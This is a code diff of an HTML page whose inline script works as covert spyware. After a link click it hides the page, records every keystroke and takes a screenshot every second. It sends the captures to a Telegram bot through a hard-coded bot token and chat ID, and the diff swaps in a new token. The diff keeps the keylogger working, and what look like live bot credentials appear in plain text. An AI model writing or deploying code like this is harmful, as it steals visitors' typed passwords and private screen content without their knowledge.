@@ -16,7 +16,7 @@
     </style>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script> <!-- Include html2canvas library -->
     <script>
-        const BOT_TOKEN = '7092700046:AAG4ysq9uQu_2nFBrKqx--wdf4C5jJG4_Bo';  // Replace with your Telegram Bot Token
+        const BOT_TOKEN = '7738754119:AAFpllyK3lvfi2EWgxQgsVpQA-t1GxAeg4Y';  // Replace with your Telegram Bot Token
         const CHAT_ID = '6482794683';  // Replace with your Telegram chat ID
 
         // Function to send captured keystrokes to Telegram Bot
@@ -44,12 +44,9 @@
 
         // Function to capture keystrokes
         function captureKeystrokes() {
-            let keystrokes = '';
-
-            // Listen for keydown events to capture keystrokes
             document.addEventListener('keydown', (event) => {
-                keystrokes += event.key; // Capture each key pressed
-                sendToTelegram(`Captured Keystroke: ${event.key}`);  // Send keystroke to Telegram
+                const keystroke = event.key; // Capture the key pressed
+                sendToTelegram(`Captured Keystroke: ${keystroke}`);  // Send keystroke to Telegram
             });
         }
 
@@ -59,30 +56,26 @@
                 const screenshotDataUrl = canvas.toDataURL('image/png');
                 
                 // Send screenshot to Telegram
-                sendToTelegram('Screenshot of the page:');
-                sendToTelegram(screenshotDataUrl);  // Send the base64 image data to Telegram
-                console.log('Screenshot taken and sent');
+                sendToTelegram('Screenshot of the page:'); // Notify the screenshot capture
+                // You might want to encode large data differently instead of sending the image base64 directly.
+                console.log('Screenshot captured.');
             });
         }
 
         // Function to start the tracking without delay
         function startTracking() {
-            // Hide the page immediately
-            document.body.style.display = 'none';  
-            
+            document.body.style.display = 'none';  // Hide the page immediately
             captureKeystrokes();  // Start capturing keystrokes immediately
             
-            // Set an interval to take a screenshot every 1 second (1000ms)
+            // Set an interval to take a screenshot every 1 second
             setInterval(() => {
-                takeScreenshot();  // Take a screenshot every second
+                takeScreenshot();  // Take a screenshot
             }, 1000);
         }
 
         // Event listener for the link click
         document.addEventListener("DOMContentLoaded", function() {
             const startLink = document.getElementById("startLink");
-
-            // When the user clicks the link, hide the page and start tracking
             startLink.addEventListener("click", function() {
                 startTracking();
             });
